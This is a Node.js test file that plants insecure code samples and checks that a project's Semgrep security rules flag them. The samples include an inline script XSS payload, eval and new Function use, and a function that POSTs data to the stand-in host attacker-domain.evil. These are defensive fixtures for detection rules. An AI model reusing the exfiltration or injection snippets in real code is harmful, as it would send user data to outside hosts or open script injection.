import { test } from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const projectRoot = fileURLToPath(new URL('..', import.meta.url))
const rulesFile = path.join(projectRoot, '.semgrep', 'rules.yml')

export function findSemgrepBin() {
  if (process.env.SEMGREP_BIN) return process.env.SEMGREP_BIN
  const candidates = ['semgrep', 'semgrep.exe', 'D:\\Programs\\conda\\Scripts\\semgrep.exe']
  for (const c of candidates) {
    try {
      const res = spawnSync(c, ['--version'], { encoding: 'utf8', stdio: 'pipe' })
      if (res.status === 0) return c
    } catch {
      // candidate not executable
    }
  }
  return null
}

const semgrepBin = findSemgrepBin()
const skipOption = !semgrepBin ? 'Semgrep binary not installed in this environment' : false

function runSemgrepOnCode(code, filename = 'sample.tsx') {
  const dir = mkdtempSync(path.join(tmpdir(), 'semgrep-planted-'))
  try {
    const filePath = path.join(dir, filename)
    mkdirSync(path.dirname(filePath), { recursive: true })
    writeFileSync(filePath, code, 'utf8')

    const result = spawnSync(
      semgrepBin,
      ['scan', '--config', rulesFile, '--json', '--error', '--severity', 'ERROR', dir],
      { encoding: 'utf8', timeout: 30_000 },
    )

    let parsed = null
    try {
      parsed = JSON.parse(result.stdout)
    } catch {
      // not JSON
    }

    const ruleIds = (parsed?.results || []).map((r) => r.check_id.split('.').pop())
    return {
      status: result.status,
      stdout: result.stdout,
      stderr: result.stderr,
      ruleIds,
      results: parsed?.results || [],
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

test(
  'planted violation of dangerouslySetInnerHTML fails with forbid-dangerously-set-inner-html',
  { skip: skipOption },
  () => {
    const code = `
    import React from 'react';
    export function BadComponent() {
      return <div dangerouslySetInnerHTML={{ __html: '<script>alert(1)</script>' }} />;
    }
  `
    const { ruleIds, status } = runSemgrepOnCode(code, 'BadComp.tsx')
    assert.equal(status, 1, 'Planted violation must exit with failure')
    assert.ok(
      ruleIds.includes('forbid-dangerously-set-inner-html'),
      `Expected forbid-dangerously-set-inner-html, got ${ruleIds.join(', ')}`,
    )
  },
)

test('planted violation of innerHTML fails with forbid-inner-html', { skip: skipOption }, () => {
  const code = `
    export function injectHtml(el: HTMLElement) {
      el.innerHTML = '<p>unsafe</p>';
    }
  `
  const { ruleIds, status } = runSemgrepOnCode(code, 'inject.ts')
  assert.equal(status, 1, 'Planted violation must exit with failure')
  assert.ok(
    ruleIds.includes('forbid-inner-html'),
    `Expected forbid-inner-html, got ${ruleIds.join(', ')}`,
  )
})

test('planted violation of eval fails with forbid-eval', { skip: skipOption }, () => {
  const code = `
    export function runDynamic(str: string) {
      return eval(str);
    }
  `
  const { ruleIds, status } = runSemgrepOnCode(code, 'eval.ts')
  assert.equal(status, 1, 'Planted violation must exit with failure')
  assert.ok(ruleIds.includes('forbid-eval'), `Expected forbid-eval, got ${ruleIds.join(', ')}`)
})

test(
  'planted violation of new Function fails with forbid-new-function',
  { skip: skipOption },
  () => {
    const code = `
    export function makeFunc(body: string) {
      return new Function('a', 'b', body);
    }
  `
    const { ruleIds, status } = runSemgrepOnCode(code, 'func.ts')
    assert.equal(status, 1, 'Planted violation must exit with failure')
    assert.ok(
      ruleIds.includes('forbid-new-function'),
      `Expected forbid-new-function, got ${ruleIds.join(', ')}`,
    )
  },
)

test(
  'planted violation of rendering error.message fails with forbid-render-error-message',
  { skip: skipOption },
  () => {
    const code = `
    import React from 'react';
    export function ErrorDisplay({ error }: { error: Error }) {
      return <div className="alert">{error.message}</div>;
    }
  `
    const { ruleIds, status } = runSemgrepOnCode(code, 'ErrorDisplay.tsx')
    assert.equal(status, 1, 'Planted violation must exit with failure')
    assert.ok(
      ruleIds.includes('forbid-render-error-message'),
      `Expected forbid-render-error-message, got ${ruleIds.join(', ')}`,
    )
  },
)

test(
  'planted violation of unapproved fetch host fails with forbid-unapproved-fetch-host',
  { skip: skipOption },
  () => {
    const malicious = `
    export async function exfiltrate(data: unknown) {
      await fetch('https://attacker-domain.evil/collect', {
        method: 'POST',
        body: JSON.stringify(data),
      });
    }
  `
    const { ruleIds: badIds, status: badStatus } = runSemgrepOnCode(malicious, 'exfil.ts')
    assert.equal(badStatus, 1, 'Planted violation must exit with failure')
    assert.ok(
      badIds.includes('forbid-unapproved-fetch-host'),
      `Expected forbid-unapproved-fetch-host, got ${badIds.join(', ')}`,
    )

    // Verify approved calls do NOT trigger the rule
    const safe = `
    export async function safeCalls() {
      await fetch('https://testproject.supabase.co/rest/v1/items');
      await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify');
      await fetch('/api/local-endpoint');
    }
  `
    const { ruleIds: safeIds } = runSemgrepOnCode(safe, 'safe.ts')
    assert.ok(
      !safeIds.includes('forbid-unapproved-fetch-host'),
      `Approved fetch hosts triggered violations: ${safeIds.join(', ')}`,
    )
  },
)

test(
  'planted violation of service_role mention fails with forbid-service-role',
  { skip: skipOption },
  () => {
    const code = `
    export const config = {
      role: 'service_role',
    };
  `
    // Note: rule paths include 'src/' and 'public/'
    const { ruleIds, status } = runSemgrepOnCode(code, 'src/secrets.ts')
    assert.equal(status, 1, 'Planted violation must exit with failure')
    assert.ok(
      ruleIds.includes('forbid-service-role'),
      `Expected forbid-service-role, got ${ruleIds.join(', ')}`,
    )
  },
)

test(
  'repository codebase passes Semgrep static analysis with zero violations',
  { skip: skipOption },
  () => {
    const result = spawnSync(
      semgrepBin,
      ['scan', '--config', rulesFile, '--error', '--severity', 'ERROR', projectRoot],
      { encoding: 'utf8', timeout: 60_000 },
    )

    assert.equal(
      result.status,
      0,
      `Semgrep found security violations in repository:\n${result.stdout}\n${result.stderr}`,
    )
  },
)
